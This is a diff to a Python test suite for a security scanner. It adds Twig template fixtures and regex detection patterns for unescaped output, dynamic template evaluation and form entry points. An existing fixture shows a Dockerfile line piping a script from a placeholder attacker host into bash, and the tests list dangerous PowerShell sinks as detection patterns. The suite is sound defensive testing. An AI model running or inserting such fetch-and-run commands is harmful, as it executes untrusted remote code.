@@ -23,8 +23,8 @@ Mechanics this suite leans on (verified against the source, not assumed):
 * `_STREAM_IMPORT_PATTERNS` / `_STREAM_EXTRA_SINK_PATTERNS` /
   `_STREAM_EXTRA_ENTRY_PATTERNS` fire only when the whole artifact is
   produced by `streaming_security_fallback` (directly, or via a degraded
-  `index_file`). For the eight lightweight languages (blade, dockerfile,
-  shell, powershell, lua, html, css, freemarker) the NORMAL route is
+  `index_file`). For the nine lightweight languages (blade, dockerfile,
+  shell, powershell, lua, html, css, freemarker, twig) the NORMAL route is
   `_index_lightweight`'s own hand-written extractor -- these three tables
   are reachable only through a genuine degradation, which a real 2026
   target hits via `parser_boundary.py`'s `giant_line_resource_limit` /
@@ -185,6 +185,7 @@ BLADE_SOURCES_SRC = """\
 <p>{{ $user->name }}</p>
 <p>{!! $user->bio !!}</p>
 """
+TWIG_SOURCES_SRC = "<p>{{ user.name }}</p>\n"
 
 C_SOURCES_SRC = """\
 #include <stdlib.h>
@@ -293,6 +294,10 @@ BLADE_IMPORT_SRC = (
     "@extends('layouts.app')\n@include('partials.header')\n"
     '<script src="app.js"></script>\n'
 )
+TWIG_IMPORT_SRC = (
+    "{% extends 'layouts/base.html.twig' %}\n{% include 'partials/header.html.twig' %}\n"
+    '<script src="app.js"></script>\n'
+)
 
 DOCKERFILE_SINK_SRC = (
     "FROM alpine\nRUN curl https://evil.example.com/x.sh | bash\nRUN chmod -R 0777 /app\n"
@@ -322,6 +327,11 @@ BLADE_SINK_SRC = (
     '<button onclick="go()">Go</button>\n'
 )
 BLADE_ENTRY_SRC = '<form action="/tags/save" method="post"></form>\n'
+TWIG_SINK_SRC = (
+    "<p>{{ name }}</p>\n<p>{{ bio|raw }}</p>\n"
+    '<button onclick="go()">Go</button>\n<p>{{ template_from_string(page.body) }}</p>\n'
+)
+TWIG_ENTRY_SRC = '<form action="/tags/save" method="post"></form>\n'
 
 SHELL_ENTRY_SRC = "#!/bin/bash\necho hi\n"
 DOCKERFILE_ENTRY_SRC = 'FROM alpine\nCMD ["run"]\nENTRYPOINT ["/bin/app"]\n'
@@ -398,6 +408,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("source", "html", r"\{\{[^}\r\n]+\}\}|<%[^%\r\n]+%>", "source", HTML_SOURCES_SRC, "index.html", "{{ user.name }}", "template_input"),
     ("source", "css", r"\{\{[^}\r\n]+\}\}|<%[^%\r\n]+%>", "source", CSS_SOURCES_SRC, "style.css", "{{theme}}", "template_input"),
     ("source", "freemarker", r"[$#]\{[^}\r\n]+\}", "source", FREEMARKER_SOURCES_SRC, "page.ftl", "${user.name}", "template_input"),
+    ("source", "twig", r"\{\{[^}\r\n]+\}\}", "source", TWIG_SOURCES_SRC, "page.html.twig", "{{ user.name }}", "template_input"),
     ("source", "powershell", r"\$(?:args|PSBoundParameters|MyInvocation)\b", "source", PS_SOURCES_SRC, "script.ps1", "$name = $args[0]", "script_parameter"),
     ("source", "powershell", r"\$env:[A-Za-z_]\w*", "source", PS_SOURCES_SRC, "script.ps1", "$key = $env:API_KEY", "environment_input"),
     ("source", "powershell", r"\bRead-Host\b", "source", PS_SOURCES_SRC, "script.ps1", "$answer = Read-Host", "interactive_input"),
@@ -428,6 +439,8 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("import", "powershell", r"^\s*\.\s+[^\s\r\n]+\.psm?1", "import", PS_IMPORT_SRC, "mod.ps1", "helpers.psm1", None),
     ("import", "blade", r"@(?:extends|include(?:First|Unless|When|If)?|component|each)\s*\([^\r\n)]*", "import", BLADE_IMPORT_SRC, "x.blade.php", "@extends('layouts.app')", None),
     ("import", "blade", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", BLADE_IMPORT_SRC, "x.blade.php", '<script src="app.js">', None),
+    ("import", "twig", r"\{%[-~]?\s*(?:extends|include|embed|import|from)\b[^\r\n%]*", "import", TWIG_IMPORT_SRC, "x.html.twig", "{% extends 'layouts/base.html.twig'", None),
+    ("import", "twig", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", TWIG_IMPORT_SRC, "x.html.twig", '<script src="app.js">', None),
     # ========================== extra sinks =================================
     ("extra_sink", "php", treesitter_streaming._PHP_STREAM_INCLUDE, "extra_sink", PHP_IMPORT_SRC, "x.php", "require 'c.php';", "file_inclusion"),
     ("extra_sink", "php", treesitter_catalogues._PHP_STREAM_EXTRACT, "extra_sink",
@@ -448,6 +461,10 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("extra_sink", "blade", r"\{!![^!\r\n]+!!\}", "extra_sink", BLADE_SINK_SRC, "x.blade.php", "{!! $bio !!}", "unescaped_output"),
     ("extra_sink", "blade", r"\{\{(?!--)[^}\r\n]+\}\}", "extra_sink", BLADE_SINK_SRC, "x.blade.php", "{{ $name }}", "template_interpolation"),
     ("extra_sink", "blade", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", BLADE_SINK_SRC, "x.blade.php", 'onclick="go()"', "inline_event_handler"),
+    ("extra_sink", "twig", r"\{\{[^}\r\n]*\|\s*raw\b[^}\r\n]*\}\}|\{%[-~]?\s*autoescape\s+false\b", "extra_sink", TWIG_SINK_SRC, "x.html.twig", "{{ bio|raw }}", "unescaped_output"),
+    ("extra_sink", "twig", r"\{\{(?![^}\r\n]*\|\s*raw\b)[^}\r\n]+\}\}", "extra_sink", TWIG_SINK_SRC, "x.html.twig", "{{ name }}", "template_interpolation"),
+    ("extra_sink", "twig", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", TWIG_SINK_SRC, "x.html.twig", 'onclick="go()"', "inline_event_handler"),
+    ("extra_sink", "twig", r"\btemplate_from_string\s*\(", "extra_sink", TWIG_SINK_SRC, "x.html.twig", "template_from_string(", "twig_dynamic_evaluation"),
     # powershell's 8 -- dual-path, tested via plain index_file (route="ps_sink")
     ("extra_sink", "powershell", r"\b(?:Invoke-Expression|iex)\b|\[scriptblock\]::Create\s*\(|\bAdd-Type\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Invoke-Expression $cmd", "dynamic_code_evaluation"),
     ("extra_sink", "powershell", r"\b(?:Start-Process|Invoke-Item|Invoke-Command|Start-Job)\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Start-Process notepad.exe", "process_exec"),
@@ -482,6 +499,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("extra_entry", "freemarker", r"<#(?:macro|function)\s", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", "<#macro alert kind>", "freemarker_macro"),
     ("extra_entry", "powershell", r"^\s*param\s*\(", "extra_entry", PS_ENTRY_SRC, "mod2.ps1", "param(", "script_parameters"),
     ("extra_entry", "blade", r"<form\b", "extra_entry", BLADE_ENTRY_SRC, "x.blade.php", '<form action="/tags/save"', "html_form"),
+    ("extra_entry", "twig", r"<form\b", "extra_entry", TWIG_ENTRY_SRC, "x.html.twig", '<form action="/tags/save"', "html_form"),
 ]
 
 
@@ -743,9 +761,9 @@ def test_catalogue_sweep_covers_every_streaming_pattern() -> None:
         | _real_extra_sink_keys()
         | _real_extra_entry_keys()
     )
-    assert len(real_keys) == 104, (
-        f"expected 104 streaming catalogue entries (42 sources + 23 imports + "
-        f"27 extra sinks + 12 extra entry points), found {len(real_keys)}. The catalogue "
+    assert len(real_keys) == 112, (
+        f"expected 112 streaming catalogue entries (43 sources + 25 imports + "
+        f"31 extra sinks + 13 extra entry points), found {len(real_keys)}. The catalogue "
         f"has drifted since this audit; update LIVE_CASES/OBSOLETE_PATTERNS."
     )
 
